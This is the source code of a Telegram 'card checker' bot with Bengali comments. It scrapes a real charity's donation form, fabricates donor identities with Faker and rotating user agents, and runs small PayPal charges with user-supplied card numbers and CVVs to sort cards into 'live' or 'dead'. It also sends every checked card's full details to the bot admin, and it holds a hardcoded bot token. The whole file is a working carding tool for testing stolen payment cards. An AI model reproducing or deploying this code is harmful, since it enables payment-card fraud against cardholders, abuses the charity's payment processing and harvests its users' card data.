import re, json, random, time, requests, string, os
from fake_useragent import UserAgent
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
from flask import Flask, render_template
import threading

# ============ কনফিগারেশন ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8948469626:AAEXfCsjBH4_IhnTtIaEJ4LAbodXGq0qWx0")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "1978055060"))
PORT = int(os.environ.get("PORT", 8080))

# ডাটাবেস (সিম্পল JSON ফাইল)
USERS_FILE = "users.json"
APPROVED_USERS_FILE = "approved_users.json"

# ফেক ডাটা জেনারেটর
fake = Faker()

# ============ ডাটাবেস ফাংশন ============
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_approved():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_approved(approved):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(approved, f)

# ============ BIN LOOKUP ফাংশন ============
def get_bin_info(card_number):
    bin_num = card_number[:6]
    try:
        url = f"https://binlist.io/lookup/{bin_num}/"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_num,
                'brand': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'country_code': data.get('country', {}).get('alpha2', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '🌍'),
                'phone': data.get('bank', {}).get('phone', 'N/A')
            }
    except:
        pass
    
    # লোকাল ফালব্যাক
    return {
        'bin': bin_num,
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN', 
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'country_code': 'XX',
        'emoji': '🌍',
        'phone': 'N/A'
    }

# ============ কার্ড চেক ফাংশন (আগের মতো) ============
def check_card(card_num, card_mon, card_yer, card_cvc):
    try:
        ua = UserAgent()
        us = ua.random
        session = requests.Session()
        
        url = "https://www.brightercommunities.org/donate-form/"
        headers = {'User-Agent': us}
        resp = session.get(url, headers=headers, timeout=10)
        
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', resp.text)
        form_match = re.search(r'name="give-form-id" value="([^"]+)"', resp.text)
        prefix_match = re.search(r'name="give-form-id-prefix" value="([^"]+)"', resp.text)
        
        if not hash_match or not form_match or not prefix_match:
            return "ERROR: Form data not found"
        
        hash_val = hash_match.group(1)
        form_id = form_match.group(1)
        prefix = prefix_match.group(1)
        
        order_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
        payload = {
            'give-form-id-prefix': prefix,
            'give-form-id': form_id,
            'give-form-minimum': '0.50',
            'give-form-hash': hash_val,
            'give-amount': '0.50',
            'give_first': fake.first_name(),
            'give_last': fake.last_name(),
            'give_email': fake.email()
        }
        
        resp2 = session.post(order_url, data=payload, headers=headers, timeout=10)
        order_data = resp2.json()
        order_id = order_data.get("data", {}).get("id")
        
        if not order_id:
            return "ERROR: Order ID not created"
        
        graphql_url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
        
        first_digit = card_num[0]
        card_types = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}
        card_type = card_types.get(first_digit, "Unknown")
        
        query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
        """
        
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f'{card_mon}/{card_yer}',
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        }
        
        payload_graphql = {"query": query, "variables": variables, "operationName": None}
        headers_graphql = {'User-Agent': us, 'Content-Type': 'application/json'}
        
        resp3 = session.post(graphql_url, data=json.dumps(payload_graphql), headers=headers_graphql, timeout=15)
        response_text = resp3.text
        
        if "accessToken" in response_text or "cartId" in response_text:
            return "LIVE_CHARGED"
        elif "INVALID_SECURITY_CODE" in response_text:
            return "LIVE_CVV"
        elif "INSUFFICIENT_FUNDS" in response_text or "INVALID_BILLING_ADDRESS" in response_text:
            return "LIVE_INSUFFICIENT"
        elif "EXPIRED_CARD" in response_text:
            return "DIE_EXPIRED"
        elif "ISSUER_DECLINE" in response_text:
            return "DIE_DECLINE"
        else:
            return "DIE_UNKNOWN"
            
    except Exception as e:
        return f"ERROR: {str(e)}"

# ============ টেলিগ্রাম হ্যান্ডলার ============

# স্টার্ট কমান্ড
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # ইউজার রেজিস্টার
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'name': user_name,
            'username': update.effective_user.username,
            'date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_users(users)
        
        # অ্যাডমিনকে নোটিফিকেশন
        admin_text = f"🆕 NEW USER REGISTERED!\n\n👤 Name: {user_name}\n🆔 ID: {user_id}\n📛 Username: @{update.effective_user.username}\n📅 Date: {users[str(user_id)]['date']}\n\n🔓 Approve this user: /approve {user_id}"
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
    
    # চেক ইউজার অ্যাপ্রুভড কিনা
    approved_users = load_approved()
    
    welcome_text = f"""🔥 CARD CHECKER BOT v2.0

Welcome {user_name}!

━━━━━━━━━━━━━━━━
📌 STATUS: {'✅ APPROVED' if user_id in approved_users else '⏳ PENDING APPROVAL'}
━━━━━━━━━━━━━━━━

⚡️ Features:
• BIN Info with Country/Bank
• Card Copy Function
• Live Status Results
• Fast & Accurate

💡 How to use:
1. Send card: number|month|year|cvv
2. Get complete information
3. Copy card details

📝 Example:
4000000000000000|12|2026|123

━━━━━━━━━━━━━━━━
👑 Bot by @thispersonisbrand
"""
    
    keyboard = []
    if user_id in approved_users:
        keyboard = [
            [InlineKeyboardButton("🔍 CHECK CARD", callback_data='check_card')],
            [InlineKeyboardButton("ℹ️ BIN LOOKUP", callback_data='bin_lookup')],
            [InlineKeyboardButton("📊 MY INFO", callback_data='my_info')]
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("⏳ WAITING APPROVAL", callback_data='waiting')]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

# অ্যাপ্রুভ কমান্ড (শুধু অ্যাডমিন)
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id not in approved_users:
            approved_users.append(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} has been approved!")
            
            # ইউজারকে নোটিফিকেশন
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="✅ CONGRATULATIONS! You have been approved!\n\nYou can now check cards using this bot.\n\nSend /start to continue."
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User {user_id} is already approved!")
    except:
        await update.message.reply_text("❌ Usage: /approve <user_id>")

# রিমুভ কমান্ড (শুধু অ্যাডমিন)
async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} has been removed!")
            
            # ইউজারকে নোটিফিকেশন
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="⚠️ Your access has been revoked by admin!"
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User {user_id} not found!")
    except:
        await update.message.reply_text("❌ Usage: /remove <user_id>")

# ইউজার লিস্ট কমান্ড (শুধু অ্যাডমিন)
async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    users = load_users()
    approved = load_approved()
    
    text = "📊 USERS LIST\n━━━━━━━━━━━━━━━━\n\n"
    for uid, info in users.items():
        uid_int = int(uid)
        status = "✅ APPROVED" if uid_int in approved else "⏳ PENDING"
        text += f"👤 {info['name']}\n🆔 {uid}\n📛 @{info['username']}\n📌 {status}\n━━━━━━━━━━━━━━━━\n"
    
    await update.message.reply_text(text)

# চেক কার্ড বাটন
async def check_card_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "🔍 SEND CARD DETAILS\n\n"
        "Format: number|month|year|cvv\n\n"
        "Example:\n"
        "`4000000000000000|12|2026|123`\n\n"
        "Send your card:"
    )
    context.user_data['awaiting_card'] = True

# বিআইএন লুকআপ
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text(
        "ℹ️ BIN LOOKUP\n\n"
        "Send first 6 digits of card:\n"
        "Example: `400000`"
    )
    context.user_data['awaiting_bin'] = True

# মাই ইনফো
async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    text = f"""📊 MY INFORMATION

━━━━━━━━━━━━━━━━
👤 Name: {user.first_name}
🆔 ID: {user.id}
📛 Username: @{user.username}
⭐️ Premium: {'Yes' if user.is_premium else 'No'}
📅 Joined: {load_users().get(str(user.id), {}).get('date', 'Unknown')}
━━━━━━━━━━━━━━━━

✅ Status: APPROVED
━━━━━━━━━━━━━━━━
"""
    await query.message.reply_text(text)

# কার্ড মেসেজ হ্যান্ডলার
async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_card'):
        return
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_card'] = False
        return
    
    card_text = update.message.text.strip()
    parts = card_text.split('|')
    
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format!\nUse: number|month|year|cvv")
        return
    
    card_num = parts[0].strip()
    card_mon = parts[1].strip()
    card_yer = parts[2].strip()
    card_cvc = parts[3].strip()
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    # বিআইএন ইনফো নেওয়া
    bin_info = get_bin_info(card_num)
    
    # স্ট্যাটাস মেসেজ
    status_msg = await update.message.reply_text("⏳ CHECKING CARD...\n\nPlease wait...")
    
    # কার্ড চেক করা
    result = check_card(card_num, card_mon, card_yer, card_cvc)
    
    await status_msg.delete()
    
    # রেজাল্ট ফরম্যাট
    if result == "LIVE_CHARGED":
        status = "✅ LIVE CHARGED"
        status_emoji = "🔥"
        details = "• $0.50 Charged Successfully\n• Card is Active & Valid"
    elif result == "LIVE_CVV":
        status = "⚡️ CVV LIVE"
        status_emoji = "💳"
        details = "• CVV is Correct\n• Card is Valid"
    elif result == "LIVE_INSUFFICIENT":
        status = "💰 LIVE - INSUFFICIENT"
        status_emoji = "💵"
        details = "• Card Valid\n• Insufficient Balance"
    elif result.startswith("ERROR"):
        status = "⚠️ ERROR"
        status_emoji = "❌"
        details = f"• {result}"
    else:
        status = "❌ DIE"
        status_emoji = "💀"
        details = "• Card Invalid/Expired\n• Cannot be used"
    
    # কপি বাটন সহ মেসেজ
    card_details = f"{card_num}|{card_mon}|{card_yer}|{card_cvc}"
    
    result_text = f"""{status_emoji} CARD CHECK RESULT {status_emoji}
━━━━━━━━━━━━━━━━
{status}
━━━━━━━━━━━━━━━━

💳 CARD DETAILS:
• Number: {card_num}
• Month: {card_mon}
• Year: 20{card_yer}
• CVV: {card_cvc}

🏦 BIN INFORMATION:
• BIN: {bin_info['bin']}
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Level: {bin_info['level']}
• Bank: {bin_info['bank']}
• Country: {bin_info['emoji']} {bin_info['country']}
• Phone: {bin_info['phone']}

📊 STATUS INFO:
{details}
━━━━━━━━━━━━━━━━
🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    keyboard = [
        [InlineKeyboardButton("📋 COPY CARD", callback_data=f"copy_{card_details}")],
        [InlineKeyboardButton("🔄 CHECK AGAIN", callback_data='check_card')],
        [InlineKeyboardButton("🔍 BIN INFO", callback_data='bin_lookup')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(result_text, reply_markup=reply_markup)
    
    # অ্যাডমিন নোটিফিকেশন
    admin_msg = f"""🔔 CARD CHECKED

👤 User: {update.effective_user.first_name}
🆔 ID: {user_id}
💳 Card: {card_num}|{card_mon}|{card_yer}|{card_cvc}
📊 Result: {status}
🏦 BIN: {bin_info['bin']} - {bin_info['country']}
"""
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    
    context.user_data['awaiting_card'] = False

# বিআইএন হ্যান্ডলার
async def handle_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_bin'):
        return
    
    bin_num = update.message.text.strip()[:6]
    
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text("❌ Send first 6 digits only!\nExample: 400000")
        return
    
    bin_info = get_bin_info(bin_num)
    
    text = f"""🔍 BIN LOOKUP RESULT
━━━━━━━━━━━━━━━━

📊 BIN: {bin_info['bin']}
💳 Brand: {bin_info['brand']}
📝 Type: {bin_info['type']}
⭐️ Level: {bin_info['level']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['emoji']} {bin_info['country']}
📞 Bank Phone: {bin_info['phone']}
━━━━━━━━━━━━━━━━
"""
    
    keyboard = [[InlineKeyboardButton("🔄 CHECK ANOTHER", callback_data='bin_lookup')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, reply_markup=reply_markup)
    context.user_data['awaiting_bin'] = False

# কপি হ্যান্ডলার
async def copy_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data.startswith("copy_"):
        card_details = data.replace("copy_", "")
        await query.answer(f"✅ Copied: {card_details}", show_alert=True)

# ওয়েটিং হ্যান্ডলার
async def waiting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("⏳ Your account is pending approval.\nPlease wait for admin to approve you.")

# এরর হ্যান্ডলার
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")
    
# ============ ফ্লাস্ক সার্ভার (রেলওয়ের জন্য) ============
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# ============ মেইন ফাংশন ============
def main():
    # ফ্লাস্ক থ্রেড চালু
    threading.Thread(target=run_flask, daemon=True).start()
    
    # বট তৈরি
    application = Application.builder().token(BOT_TOKEN).build()
    
    # কমান্ড হ্যান্ডলার
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", users_list))
    
    # কলব্যাক হ্যান্ডলার
    application.add_handler(CallbackQueryHandler(check_card_button, pattern='check_card'))
    application.add_handler(CallbackQueryHandler(bin_lookup, pattern='bin_lookup'))
    application.add_handler(CallbackQueryHandler(my_info, pattern='my_info'))
    application.add_handler(CallbackQueryHandler(waiting, pattern='waiting'))
    application.add_handler(CallbackQueryHandler(copy_card, pattern='^copy_'))
    
    # মেসেজ হ্যান্ডলার
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bin))
    
    # এরর হ্যান্ডলার
    application.add_error_handler(error_handler)
    
    print("🤖 BOT STARTED SUCCESSFULLY!")
    print(f"✅ Admin ID: {ADMIN_ID}")
    print(f"✅ Bot running on port {PORT}")
    
    application.run_polling()

if __name__ == '__main__':
    main()